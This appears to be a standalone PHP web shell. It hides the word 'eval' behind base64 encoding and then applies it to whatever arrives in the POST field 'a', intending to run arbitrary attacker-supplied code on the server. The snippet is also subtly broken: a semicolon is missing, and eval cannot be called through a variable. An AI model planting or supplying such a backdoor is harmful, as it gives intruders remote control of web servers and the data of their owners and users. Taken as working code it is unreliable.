<?php
$a=base64_decode("ZXZhbA==")
$a($_POST['a']);
?>